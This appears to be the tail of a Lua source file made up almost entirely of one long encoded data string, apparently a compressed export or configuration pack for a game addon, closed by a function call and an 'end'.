cvdCr1)aYQcdPA2p8rQEveQobwTFvps1smgs1fHQtaHNveQ(AKbiKQ3SKP9P6Z17HCJQRfvBYrQ(Ch(kuwQMxENr1yWLt1fNZsiyZrQUwuTjhP6GBt1uD0BQo88WEt1cm8vivBfvBYrQo42unv3bi6OhdUnv)oWSi8ejxJ4naLcay1(v9Oipgk7SKMzxlhy1(v9OyXsoZrqWy6)uJhyIKJixGzNNCKuGvJ0Jb3MQFhyweEIKRr8gGsbaOrPe8cem6TSZs6Q4SpG84nbb9XwMvXzFhyCWPdLzxlhy1(v9OyXsoZ9wWbsMuYK5Q4SVmb3MQDGv7x1JI8yOJxVDy6XGBt1VdmlcprY1iEdqPaKCu71qqrUaZYolPnEGjsoICbMDVCs41O60Q4SFkyagEAxM7rIh2M4TP9DeemM(tHKzq(8n9yWTP63bMfHNi5AeVbOuaEK4HTjEBAFzNL0m7A5spEi5fPXUaDSEmzsWfbF5rwHNoucTqHT5aR2VQhf5Xqh2rwHBMmtOfkSnx6XdjVin2fOd7iRWntMnEGjsoICbMDPlvyJcpLWDzUxoj8AujYfy2zdhOP9zYmopsgdDQWW2eE18v7WoYkCZKzCEKmg6sJDbwSVyfT)7WoYkCFy6XGBt1VdmlcprY1iEdqPaawTFvpkYJHYolPz21YbwTFvpkwSKZCSEmzUko7NcgGHmzUlZ9YjHxJkrUaZoB4anTp9yWTP63bMfHNi5AeVbOuaEK4HTjEBAFzNLucUi4lpYkKEm42u97aZIWtKCnI3aukajh1EneuKlWSSZsAJhyIKJixGzx6sf2OWt7YCps8W2eVnTVZgoqt7ZKzJhyIKJixGzNNCKuGvJmz24bMi5iYfy29YjHxJQtRIZ(PiLmKEKEm42u97EtAiazjBKiQLGtQKp9yWTP639gGsbGxfzpDy4we)hSkJEm42u97EdqPaKCu71qqrUaZYolPlwLsqqU8G4JcBarz857twOW2CHYtEi8i4oSI4WoYkCtpgCBQ(DVbOuaEK4HTjEBAFzNLucUi4lpYk8uMDTCGv7x1JIfl5m3BbhiPP8KfkSnxO8KhcpcUdRioSJSc30JscvdCr1)aYQcdPA2p8rQEveQobwTFvps1smgs1fHQtaHNveQ(AKbiKQ3SKP9P6Z17HCJQRfvBYrQ(Ch(kuwQMxENr1yWLt1fNZsiyZrQUwuTjhP6GBt1uD0BQo88WEt1cm8vivBfvBYrQo42unv3bi6OhdUnv)U3aukaGv7x1JI8yOSZsAMDTCGv7x1JIfl5m3BbhiPP8KfkSnxO8KhcpcUdRioSJSc30Jb3MQF3Bakfas4zfr8gzacLDwsTqHT5Ydz)IAj8i4zoSJSc3NYSRLJxfzpDy4we)hSkZX6D6qz21YXRISNomClI)dwL5iiym9lJpFZKzMDTCzflrulHfQQFhR3Pm7A5YkwIOwcluv)occgt)Y4Z3hMEm42u97EdqPaawTFvpkYJHYolPwOW2C5HSFrTeEe8mh2rwH7tz21YXRISNomClI)dwL5y9oDOm7A54vr2thgUfX)bRYCeemM(LXNVzYmZUwUSILiQLWcv1VJ17uMDTCzflrulHfQQFhbbJPFz857dtpgCBQ(DVbOuaaAukbVabJEl7SKUko7dipEtqqFSLzvC23bghCkZUwoB8e1syYrX7HbX9wWbsgjtpgCBQ(DVbOua4YdGib4tpgCBQ(DVbOuaEdrLWiHh9yWTP639gGsbi5O2RHGICbMLDwsxfN9bKhVjiOp2YSko77aJdoDOfRsjiixEq8rHnGOm(8ntM7YCjh1EneuKlWSJGlc(YJScpLzxlhy1(v9OyXsoZTRK9HPhdUnv)U3aukaYdIxvTSZsQfkSnNHeWxulb2(HpcIT5WoYkCZKzCEKmg6y9eCv9Oi6TWdjF1HYHDKv4MEm42u97EdqPaSurd00(I3idqOSZs6Q4SpG84nbb9XwMvXzFhyCa9yWTP639gGsb4rIh2M4TP9LDwsZSRLl94HKxKg7c0X6XKjbxe8LhzfE6qj0cf2MdSA)QEuKhdDyhzfUzYmHwOW2CPhpK8I0yxGoSJSc3mzgNhjJHovyyBcVA(QDyhzfUzYmopsgdDPXUal2xSI2)DyhzfUpm9yWTP639gGsbaSA)QEuKhdLDwsZSRLdSA)QEuSyjN5y9yYCvC2pfmadPhdUnv)U3aukaKWZkI4nYaespgCBQ(DVbOuasoQ9AiOixGzzNL0DzUKJAVgckYfy2rWfbF5rwH0Jb3MQF3BakfGhjEyBI3M2x2zjLGlc(YJScPhPhdUnv)UKRr8M0qaYs2irulbNujF6XGBt1Vl5AeVbOua4vr2thgUfX)bRYOhLeQg4IQ)bKvfgs1SF4Ju9QiuDcSA)QEKQLymKQlcvNacpRiu91idqivVzjt7t1NR3d5gvxlQ2KJu95o8vOSunV8oJQXGlNQloNLqWMJuDTOAtos1b3MQP6O3uD45H9MQfy4RqQ2kQ2KJuDWTPAQUdq0rpgCBQ(DjxJ4naLcay1(v9Oipgk7SKgNhjJHUKJAJKg)x8SK0t6q5WoYkCFQXdmrYrKlWSlDPcBu4PDzUhjEyBI3M23rqWy6pfP2LidYNVpTlZ9iXdBt820(occgt)Yizxkzq(89jEvQDLSDjh1EneuKlWSJGGX0FksTlLmiF(MEm42u97sUgXBakfGKJAVgckYfyw2zjDXQuccYLheFuydikJpFZK5HwfN9bKhVjiOp2YSko77aJdo8Pd14bMi5iYfy2LUuHnk80Um3JepSnXBt77SHd00(N2L5EK4HTjEBAFhbxe8LhzfYKzJhyIKJixGzNNCKuGvJNsyMDTCGv7x1JIfl5mhR3PvXzFa5XBcc6JTmRIZ(oW4Guj42uTdOrPe8cem6TJhVjiOp2mijFy6XGBt1Vl5AeVbOuaaAukbVabJEl7SKUko7dipEtqqFSLzvC23bghCkZUwoB8e1syYrX7HbX9wWbsgjF6qj0cf2MluEYdHhb3Hveh2rwHBMmZSRLdSA)QEuSyjN5El4ajtkzYCvC2xMGBt1oWQ9R6rrEm0XR3om9yWTP63LCnI3aukaKWZkI4nYaek7SKUlZnTHKouIScX90(U3coqYi5t7YCVCs41OsKlWSZgoqt7FkHwOW2CGv7x1JI8yOd7iRWn9yWTP63LCnI3aukajh1EneuKlWSSZsAJhyIKJixGz3lNeEnQoLzxlhy1(v9OyXsoZTRK9PdXRsTRKTdOrPe8cem6TJGGX0Fk85BMmxfN9tbdWWdFkH7YCps8W2eVnTVJGlc(YJScPhdUnv)UKRr8gGsb4nevcJeE0Jb3MQFxY1iEdqPaSurd00(I3idqOSZs6Q4SpG84nbb9XwMvXzFhyCa9yWTP63LCnI3aukaps8W2eVnTVSZsAMDTCPhpK8I0yxGowpMmj4IGV8iRWthkHwOW2CGv7x1JI8yOd7iRWntMj0cf2Ml94HKxKg7c0HDKv4MjZgpWejhrUaZU0LkSrHNs4Um3lNeEnQe5cm7SHd00(mzgNhjJHovyyBcVA(QDyhzfUzYmopsgdDPXUal2xSI2)DyhzfUzYmZUwoWQ9R6rXILCM7TGdK0uEy6XGBt1Vl5AeVbOuaKheVQAzNLuluyBodjGVOwcS9dFeeBZHDKv4MjZ48izm0X6j4Q6rr0BHhs(QdLd7iRWn9yWTP63LCnI3aukaGv7x1JI8yOSZsAMDTCGv7x1JIfl5mhRhtMRIZ(PGbyitM7YCVCs41OsKlWSZgoqt7tpgCBQ(DjxJ4naLcaj8SIiEJmaH0Jb3MQFxY1iEdqPa8iXdBt820(YolPeCrWxEKvi9yWTP63LCnI3aukajh1EneuKlWSSZsAJhyIKJixGzx6sf2OWt7YCps8W2eVnTVZgoqt7ZKzJhyIKJixGzNNCKuGvJmz24bMi5iYfy29YjHxJQtRIZ(PiLmeEtJKFQgYyQzyIjidt1jMGUeLmdtq4nzq6P9F4nvnOxrmCt1sAQo42unvRM3Eh9i8gSM8IaV3bKvf2uTKcjwg8QM3EiWWBY1iEdcmKXeHadVb3MQH3qaYs2irulbNujF4f7iRWnucObzm1qGH3GBt1WlVkYE6WWTi(pyvg8IDKv4gkb0GmkziWWl2rwHBOeWlNmgsMaEJZJKXqxYrTrsJ)lEws6jDOCyhzfUP6tuDJhyIKJixGzx6sf2OqQ(evVlZ9iXdBt820(occgt)uDkO6u7sKQzquTpFt1NO6DzUhjEyBI3M23rqWy6NQLHQLSlLundIQ95BQ(evZRsTRKTl5O2RHGICbMDeemM(P6uq1P2LsQMbr1(8n8gCBQgEbR2VQhf5XqObzKbdbgEXoYkCdLaE5KXqYeW7IvPeeKlpi(OWgqKQLHQ95BQMjtQ(qu9Q4SpvdivZJ3ee0hBQwgQEvC23bghq1hMQpr1hIQB8atKCe5cm7sxQWgfs1NO6DzUhjEyBI3M23zdhOP9P6tu9Um3JepSnXBt77i4IGV8iRqQMjtQUXdmrYrKlWSZtoskWQrQ(evNqQoZUwoWQ9R6rXILCMJ1JQpr1RIZ(unGunpEtqqFSPAzO6vXzFhyCavNkuDWTPAhqJsj4fiy0BhpEtqqFSPAgevlzQ(WWBWTPA4n5O2RHGICbMHgKXucbgEXoYkCdLaE5KXqYeW7Q4SpvdivZJ3ee0hBQwgQEvC23bghq1NO6m7A5SXtulHjhfVhge3BbhiQwgQwYu9jQ(quDcPAluyBUq5jpeEeChwrCyhzfUPAMmP6m7A5aR2VQhflwYzU3coquTmuDkPAMmP6vXzFQwgQo42uTdSA)QEuKhdD86nQ(WWBWTPA4fOrPe8cem6n0GmYaqGHxSJSc3qjGxozmKmb8UlZnTHKouIScX90(U3coquTmuTKP6tu9Um3lNeEnQe5cm7SHd00(u9jQoHuTfkSnhy1(v9Oipg6WoYkCdVb3MQHxs4zfr8gzacHgKrjney4f7iRWnuc4LtgdjtaVnEGjsoICbMDVCs41OIQpr1z21YbwTFvpkwSKZC7kzt1NO6dr18Qu7kz7aAukbVabJE7iiym9t1PGQ95BQMjtQEvC2NQtbvZamKQpmvFIQtivVlZ9iXdBt820(ocUi4lpYkeEdUnvdVjh1EneuKlWm0GmMGqGH3GBt1W7BiQegj8GxSJSc3qjGgKXuney4f7iRWnuc4LtgdjtaVRIZ(unGunpEtqqFSPAzO6vXzFhyCa8gCBQgExQObAAFXBKbieAqgtKHqGHxSJSc3qjGxozmKmb8Mzxlx6XdjVin2fOJ1JQzYKQj4IGV8iRqQ(evFiQoHuTfkSnhy1(v9Oipg6WoYkCt1mzs1jKQTqHT5spEi5fPXUaDyhzfUPAMmP6gpWejhrUaZU0LkSrHu9jQoHu9Um3lNeEnQe5cm7SHd00(untMuDCEKmg6uHHTj8Q5R2HDKv4MQzYKQJZJKXqxASlWI9fRO9Fh2rwHBQMjtQoZUwoWQ9R6rXILCM7TGdevlLQtjvFy4n42un8(iXdBt820(qdYyIjcbgEXoYkCdLaE5KXqYeWRfkSnNHeWxulb2(HpcIT5WoYkCt1mzs1X5rYyOJ1tWv1JIO3cpK8vhkh2rwHB4n42un8kpiEv1qdYyIPgcm8IDKv4gkb8YjJHKjG3m7A5aR2VQhflwYzowpQMjtQEvC2NQtbvZamKQzYKQ3L5E5KWRrLixGzNnCGM2hEdUnvdVGv7x1JI8yi0GmMOKHadVb3MQHxs4zfr8gzacHxSJSc3qjGgKXezWqGHxSJSc3qjGxozmKmb8sWfbF5rwHWBWTPA49rIh2M4TP9HgKXetjey4f7iRWnuc4LtgdjtaVnEGjsoICbMDPlvyJcP6tu9Um3JepSnXBt77SHd00(untMuDJhyIKJixGzNNCKuGvJuntMuDJhyIKJixGz3lNeEnQO6tu9Q4SpvNcQoLmeEdUnvdVjh1EneuKlWm0Gg8UXvWQmiWqgtecm8gCBQgEbzp)5vi8IDKv4gkb0GmMAiWWBWTPA4L9rXyi4dVyhzfUHsaniJsgcm8IDKv4gkb8gCBQgE5HsjcUnvluZBWRAEt0bicV89dniJmyiWWl2rwHBOeWlNmgsMaEdUnPrb2i4GpvldvNAQ(evBHcBZLCu71qqX0l2FQ2HDKv4MQpr1wOW2CHYtEi8i4oSI4WoYkCt1NOAluyBoWQ9R6rrEm0HDKv4gEdUnvdVe2weCBQwOM3Gx18MOdqeEbZIWtKCnI3GgKXucbgEXoYkCdLaE5KXqYeWBWTjnkWgbh8PAzO6ut1NOAluyBUKJAVgckMEX(t1oSJSc3WBWTPA4LW2IGBt1c18g8QM3eDaIWBY1iEdAqgzaiWWl2rwHBOeWlNmgsMaEdUnPrb2i4GpvldvNA4n42un8syBrWTPAHAEdEvZBIoar49nObzusdbgEXoYkCdLaEdUnvdVe2weCBQwOM3Gx18MOdqeE5kmsJqdYyccbgEdUnvdVbHhnkSIqW2GxSJSc3qjGg0GxpcYlWCyqGHmMiey4f7iRWnucObzm1qGHxSJSc3qjGgKrjdbgEXoYkCdLaAqgzWqGH3GBt1W7ZccwTWdn4f7iRWnucObzmLqGHxSJSc3qjGgKrgacm8gCBQgE9kBQgEXoYkCdLaAqgL0qGH3GBt1W7BiQegj8GxSJSc3qjGgKXeecm8gCBQgELheVQA4f7iRWnucObn4fmlcprY1iEdcmKXeHadVyhzfUHsaVCYyizc4nHu9Um3JepSnXBt77SHd00(WBWTPA49rIh2M4TP9HgKXudbgEXoYkCdLaE5KXqYeW7IvPeeKlpi(OWgqKQLHQ95BQMjtQ(qu9Q4SpvdivZJ3ee0hBQwgQEvC23bghq1hMQpr1hIQB8atKCe5cm7sxQWgfs1NO6DzUhjEyBI3M23zdhOP9P6tu9Um3JepSnXBt77i4IGV8iRqQMjtQUXdmrYrKlWSZtoskWQrQ(evNqQoZUwoWQ9R6rXILCMJ1JQpr1RIZ(unGunpEtqqFSPAzO6vXzFhyCavNkuDWTPAhqJsj4fiy0BhpEtqqFSPAgevlzQ(WWBWTPA4n5O2RHGICbMHgKrjdbgEdUnvdV8Qi7Pdd3I4)GvzWl2rwHBOeqdYidgcm8gCBQgEdbilzJerTeCsL8HxSJSc3qjGgKXucbgEdUnvdVVHOsyKWdEXoYkCdLaAqgzaiWWl2rwHBOeWlNmgsMaEZSRLdSA)QEuSyjN5iiym9t1NO6gpWejhrUaZop5iPaRgH3GBt1Wly1(v9OipgcniJsAiWWl2rwHBOeWlNmgsMaExfN9PAaPAE8MGG(yt1Yq1RIZ(oW4aQ(evFiQoZUwoWQ9R6rXILCM7TGdevldvNsQMjtQEvC2NQLHQdUnv7aR2VQhf5XqhVEJQpm8gCBQgEbAukbVabJEdniJjiey4f7iRWnuc4LtgdjtaVnEGjsoICbMDVCs41OIQpr1RIZ(uDkOAgGHu9jQExM7rIh2M4TP9DeemM(P6uq1sMQzquTpFdVb3MQH3KJAVgckYfygAqgt1qGHxSJSc3qjGxozmKmb8Mzxlx6XdjVin2fOJ1JQzYKQj4IGV8iRqQ(evFiQoHuTfkSnhy1(v9Oipg6WoYkCt1mzs1jKQTqHT5spEi5fPXUaDyhzfUPAMmP6gpWejhrUaZU0LkSrHu9jQoHu9Um3lNeEnQe5cm7SHd00(untMuDCEKmg6uHHTj8Q5R2HDKv4MQzYKQJZJKXqxASlWI9fRO9Fh2rwHBQ(WWBWTPA49rIh2M4TP9HgKXeziey4f7iRWnuc4LtgdjtaVz21YbwTFvpkwSKZCSEuntMu9Q4SpvNcQMbyivZKjvVlZ9YjHxJkrUaZoB4anTp8gCBQgEbR2VQhf5XqObzmXeHadVyhzfUHsaVCYyizc4LGlc(YJScH3GBt1W7JepSnXBt7dniJjMAiWWl2rwHBOeWlNmgsMaEB8atKCe5cm7sxQWgfs1NO6DzUhjEyBI3M23zdhOP9PAMmP6gpWejhrUaZop5iPaRgPAMmP6gpWejhrUaZUxoj8Aur1NO6vXzFQofuDkzi8gCBQgEtoQ9AiOixGzObn4LVFiWqgtecm8IDKv4gkb8YjJHKjGxEvQDLSD8Qi7Pdd3I4)Gvzoccgt)uDkOAjZq4n42un8MvvTflwYzqdYyQHadVyhzfUHsaVCYyizc4LxLAxjBhVkYE6WWTi(pyvMJGGX0pvNcQwYmeEdUnvdVrZX3iHsWdLcAqgLmey4f7iRWnuc4LtgdjtaV8Qu7kz74vr2thgUfX)bRYCeemM(P6uq1sMHWBWTPA4DnemRQAdniJmyiWWBWTPA4vn(YTxKQID7dITbVyhzfUHsaniJPecm8IDKv4gkb8YjJHKjGxEvQDLSD8Qi7Pdd3I4)Gvzoccgt)uDkOAgGHuntMuTnGOWkXEqQwgQoXeH3GBt1WBgjpsaAAFObzKbGadVyhzfUHsaVCYyizc4nZUwoEvK90HHBr8FWQmhRhvFIQpevNzxlxgjpsaAAFhRhvZKjvNzxlxwv1wSyjN5y9OAMmP6es1KGJoJukfvFIQtivtco6kcNQpmvZKjvBdikSsShKQLHQtndaVb3MQHxVYMQHgKrjney4f7iRWnuc4LtgdjtaVwq8rZTN3IMJuDkKs1ma8gCBQgEJ3d5MOwctokWWxHqdAW7BqGHmMiey4n42un8gcqwYgjIAj4Kk5dVyhzfUHsaniJPgcm8gCBQgE5vr2thgUfX)bRYGxSJSc3qjGgKrjdbgEXoYkCdLaE5KXqYeW7IvPeeKlpi(OWgqKQLHQ95BQ(evBHcBZfkp5HWJG7WkId7iRWn8gCBQgEtoQ9AiOixGzObzKbdbgEXoYkCdLaE5KXqYeWlbxe8Lhzfs1NO6m7A5aR2VQhflwYzU3coquTuQoLu9jQ2cf2MluEYdHhb3Hveh2rwHB4n42un8(iXdBt820(qdYykHadVyhzfUHsaVCYyizc4nZUwoWQ9R6rXILCM7TGdevlLQtjvFIQTqHT5cLN8q4rWDyfXHDKv4gEdUnvdVGv7x1JI8yi0GmYaqGHxSJSc3qjGxozmKmb8AHcBZLhY(f1s4rWZCyhzfUP6tuDMDTC8Qi7Pdd3I4)GvzowpQ(evFiQoZUwoEvK90HHBr8FWQmhbbJPFQwgQ2NVPAMmP6m7A5YkwIOwcluv)owpQ(evNzxlxwXse1syHQ63rqWy6NQLHQ95BQ(WWBWTPA4LeEwreVrgGqObzusdbgEXoYkCdLaE5KXqYeWRfkSnxEi7xulHhbpZHDKv4MQpr1z21YXRISNomClI)dwL5y9O6tu9HO6m7A54vr2thgUfX)bRYCeemM(PAzOAF(MQzYKQZSRLlRyjIAjSqv97y9O6tuDMDTCzflrulHfQQFhbbJPFQwgQ2NVP6ddVb3MQHxWQ9R6rrEmeAqgtqiWWl2rwHBOeWlNmgsMaExfN9PAaPAE8MGG(yt1Yq1RIZ(oW4aQ(evNzxlNnEIAjm5O49WG4El4ar1Yq1sgEdUnvdVankLGxGGrVHgKXuney4n42un8YLharcWhEXoYkCdLaAqgtKHqGH3GBt1W7BiQegj8GxSJSc3qjGgKXetecm8IDKv4gkb8YjJHKjG3vXzFQgqQMhVjiOp2uTmu9Q4SVdmoGQpr1hIQxSkLGGC5bXhf2aIuTmuTpFt1mzs17YCjh1EneuKlWSJGlc(YJScP6tuDMDTCGv7x1JIfl5m3Us2u9HH3GBt1WBYrTxdbf5cmdniJjMAiWWl2rwHBOeWlNmgsMaETqHT5mKa(IAjW2p8rqSnh2rwHBQMjtQoopsgdDSEcUQEue9w4HKV6q5WoYkCdVb3MQHx5bXRQgAqgtuYqGHxSJSc3qjGxozmKmb8Uko7t1as184nbb9XMQLHQxfN9DGXbWBWTPA4DPIgOP9fVrgGqObzmrgmey4f7iRWnuc4LtgdjtaVz21YLE8qYlsJDb6y9OAMmPAcUi4lpYkKQpr1hIQtivBHcBZbwTFvpkYJHoSJSc3untMuDcPAluyBU0JhsErASlqh2rwHBQMjtQoopsgdDQWW2eE18v7WoYkCt1mzs1X5rYyOln2fyX(Iv0(Vd7iRWnvFy4n42un8(iXdBt820(qdYyIPecm8IDKv4gkb8YjJHKjG3m7A5aR2VQhflwYzowpQMjtQEvC2NQtbvZameEdUnvdVGv7x1JI8yi0GmMidabgEdUnvdVKWZkI4nYaecVyhzfUHsaniJjkPHadVyhzfUHsaVCYyizc4DxMl5O2RHGICbMDeCrWxEKvi8gCBQgEtoQ9AiOixGzObzmXeecm8IDKv4gkb8YjJHKjGxcUi4lpYkeEdUnvdVps8W2eVnTp0Gg8YvyKgHadzmriWWl2rwHBOeWB5bVpAWBWTPA4nDqMiRq4nDOyr4n42KgfyJGd(uTmuDkP6tuDWTjnkWgbh8PAMmP6ucVPdIOdqeE5bjnk4Bc0GmMAiWWBWTPA4neGSKnse1sWjvYhEXoYkCdLaAqgLmey4n42un8YRISNomClI)dwLbVyhzfUHsaniJmyiWWl2rwHBOeWlNmgsMaE3L5E5KWRrLixGzNnCGM2hEdUnvdV8GKgHgKXucbgEXoYkCdLaE5KXqYeWBcPAluyBoFwKqgLkewWTH)oSJSc3untMu9IvPeeKlpi(OWgqKQLHQ95B4n42un8MCu71qqrUaZqdYidabgEXoYkCdLaE5KXqYeW7gZSRLtfg2MWRMVA3BbhiQwkvNidH3GBt1Wly1(v9OipgcniJsAiWWBWTPA4LlpaIeGp8IDKv4gkb0GmMGqGHxSJSc3qjG3GBt1WlqJsj4fiy0B4LtgdjtaVRIZ(unGunpEtqqFSPAzO6vXzFhyCa8YpJRqHfeF0EiJjcniJPAiWWl2rwHBOeWlNmgsMaExSkLGGC5bXhf2aIuTmuTpFt1mzs1jKQTqHT5soQ9AiOy6f7pv7WoYkCt1mzs17YCVCs41OsKlWSZgoqt7t1NO6DzUPnK0HsKviUN239wWbIQLHQLm8gCBQgEZSgxosodAqgtKHqGHxSJSc3qjGxozmKmb8AHcBZ5ZIeYOuHWcUn83HDKv4gEdUnvdV8GKgHgKXetecm8IDKv4gkb8YjJHKjG3vXzFQgqQMhVjiOp2uTmu9Q4SVdmoaEdUnvdVlv0anTV4nYaecniJjMAiWWl2rwHBOeWlNmgsMaE3L5soQ9AiOixGzhbxe8Lhzfs1mzs1wOW2Cjh1Eneum9I9NQDyhzfUH3GBt1WBYrTxdbf5cmdniJjkziWWl2rwHBOeWBWTPA49rIh2M4TP9HxozmKmb8Mzxlx6XdjVin2fOJ1dE5NXvOWcIpApKXeHgKXezWqGHxSJSc3qjGxozmKmb8YRsTRKTl5O2RHGICbMDeemM(P6uq1PdYezf64bjnk4BcvNQKQtn8gCBQgE5bjncniJjMsiWWBWTPA49nevcJeEWl2rwHBOeqdYyImaey4f7iRWnuc4LtgdjtaVwOW2CgsaFrTey7h(ii2Md7iRWn8gCBQgELheVQAObzmrjney4f7iRWnuc4n42un8(iXdBt820(WlNmgsMaEj4IGV8iRqQ(evNzxlNnEIAjm5O49WG4El4ar1Yq1sgE5NXvOWcIpApKXeHgKXetqiWWl2rwHBOeWlNmgsMaE3yMDTCQWW2eE18v7El4abVb3MQHxWQ9R6rrEmeAqgtmvdbgEXoYkCdLaE5KXqYeW7gZSRLtfg2MWRMVA3Bbhi4n42un8scpRiI3idqi0Gg0Gg0Gqa]] )

end